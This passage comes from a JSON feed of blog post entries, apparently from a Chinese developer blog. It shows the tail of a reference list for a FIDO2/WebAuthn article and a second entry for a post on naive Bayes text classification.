FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。 ——我瞎编的 为什么这篇文章的标题是 NLP  […]","link":"https://flyhigher.top/develop/1989.html"}]